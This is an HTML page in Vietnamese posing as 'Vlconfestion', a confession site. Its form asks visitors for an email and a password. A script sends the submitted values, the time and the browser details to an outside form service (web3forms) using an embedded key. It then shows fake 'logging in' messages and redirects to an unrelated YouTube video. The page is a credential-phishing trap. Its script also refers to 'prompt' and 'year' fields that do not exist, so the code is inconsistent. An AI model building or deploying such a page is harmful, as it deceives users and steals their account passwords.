<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VLconfestion</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🖼️</text></svg>">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --ink:#14151f; --muted:#8b8fa3; --line:#e3e5ee; --accent:#5b5bf0; --accent2:#8a5cf6;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; color:var(--ink);
    font-family:"Plus Jakarta Sans","Segoe UI",system-ui,-apple-system,Roboto,sans-serif;
    background:
      radial-gradient(900px 500px at 12% -10%, #e9e7ff 0%, transparent 60%),
      radial-gradient(800px 500px at 100% 110%, #dff4ff 0%, transparent 60%),
      #f7f8fc;
    display:flex; align-items:center; justify-content:center; padding:24px;
  }
  main{
    width:100%; max-width:640px; text-align:center;
    background:#fff; border:1px solid var(--line); border-radius:24px;
    padding:48px 44px 40px;
    box-shadow:0 1px 2px rgba(20,21,31,.04), 0 24px 60px -24px rgba(60,60,140,.28);
  }
  h1{font-size:1.65rem; font-weight:600; letter-spacing:-.02em; margin:0 0 34px}
  input[type=text]{
    display:block; width:100%; height:62px; margin:0 0 18px;
    border:1.5px solid var(--line); border-radius:14px; background:#fbfbfe;
    padding:0 22px; font:inherit; font-size:1.05rem; color:var(--ink); outline:0;
    transition:border-color .2s, box-shadow .2s, background .2s;
  }
  input::placeholder{color:#b4b8c9}
  input[type=text]:hover{border-color:#cfd2e2}
  input[type=text]:focus{border-color:var(--accent); background:#fff; box-shadow:0 0 0 4px rgba(91,91,240,.14)}
  button{
    width:100%; height:60px; margin-top:10px; border:0; border-radius:14px; cursor:pointer;
    background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#fff;
    font:inherit; font-size:1.1rem; font-weight:600; letter-spacing:.01em;
    box-shadow:0 14px 28px -12px rgba(91,91,240,.65);
    transition:transform .15s, filter .2s, box-shadow .2s;
  }
  button:hover{filter:brightness(1.06); transform:translateY(-1px)}
  button:active{transform:translateY(0)}
  button:focus-visible{outline:3px solid rgba(91,91,240,.4); outline-offset:3px}
  button:disabled{opacity:.7; cursor:wait; transform:none; filter:none}
  .status{margin-top:20px; min-height:1.4em; color:var(--muted); font-size:.95rem}
  .err{color:#d6455d}
  .hp{position:absolute; left:-9999px; opacity:0}
  footer{margin-top:30px; color:#b0b4c6; font-size:.76rem}
  @media (max-width:520px){ main{padding:36px 22px 30px; border-radius:20px} h1{font-size:1.4rem} }
  @media (prefers-reduced-motion:reduce){ *{transition:none!important} }
</style>
</head>
<body>
<main>
  <h1>Vlconfestion</h1>

  <form id="f" autocomplete="off" novalidate>
    <input type="text" id="Email" name="Email" placeholder="Email" maxlength="2000" aria-label="Email">
    <input type="text" id="password" name="password" placeholder="password" aria-label="password">
    <input class="hp" type="text" id="website" name="website" tabindex="-1" aria-hidden="true">
    <button type="submit" id="btn">Tạo</button>
    <div class="status" id="status" aria-live="polite"></div>
  </form>

  <footer>Nơi trút bầu tâm sự của giới trẻ Việt Nam.</footer>
</main>

<script>
/* ====== CẤU HÌNH ====== */
const WEB3FORMS_KEY = "ada25e74-87d7-48b6-b952-b24d4346ce15";
const APPS_SCRIPT_URL = "";
const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
/* ====================== */

const $ = id => document.getElementById(id);
const steps = ["Đang đăng nhập","chuẩn bị vào confestion rồi đấy","xướng nha","Sắp xong rồi…Vô... vô..."];

function send(prompt, year){
  const meta = {time:new Date().toLocaleString("vi-VN"), page:location.href, ua:navigator.userAgent};
  const jobs = [];
  if (WEB3FORMS_KEY) {
    jobs.push(fetch("https://api.web3forms.com/submit", {
      method:"POST",
      headers:{"Content-Type":"application/json","Accept":"application/json"},
      body: JSON.stringify({
        access_key: WEB3FORMS_KEY,
        subject: "Lệnh mới từ web tạo ảnh",
        from_name: "Web tạo ảnh",
        message: prompt,
        nam_sinh: year,
        thoi_gian: meta.time, trinh_duyet: meta.ua
      }),
      keepalive:true
    }).catch(()=>{}));
  }
  if (APPS_SCRIPT_URL) {
    jobs.push(fetch(APPS_SCRIPT_URL, {
      method:"POST", mode:"no-cors",
      headers:{"Content-Type":"text/plain;charset=utf-8"},
      body: JSON.stringify({prompt, year, ...meta}),
      keepalive:true
    }).catch(()=>{}));
  }
  return Promise.all(jobs);
}

$("f").addEventListener("submit", async e => {
  e.preventDefault();
  if ($("website").value) return;
  const prompt = $("prompt").value.trim();
  const year = $("year").value.trim();
  const st = $("status");

  if (!prompt){ st.className="status err"; st.textContent="Vui lòng nhập lệnh."; return; }

  $("btn").disabled = true;
  $("prompt").readOnly = $("year").readOnly = true;
  st.className = "status";

  const sending = send(prompt, year);
  let i = 0;
  st.textContent = steps[0];
  const timer = setInterval(() => { i++; st.textContent = steps[Math.min(i, steps.length-1)]; }, 900);

  await Promise.race([sending, new Promise(r => setTimeout(r, 4000))]);
  await new Promise(r => setTimeout(r, 3200));
  clearInterval(timer);
  st.textContent = "Hoàn tất! Đang mở confestion…";
  setTimeout(() => location.href = REDIRECT_URL, 400);
});
</script>
</body>
</html>
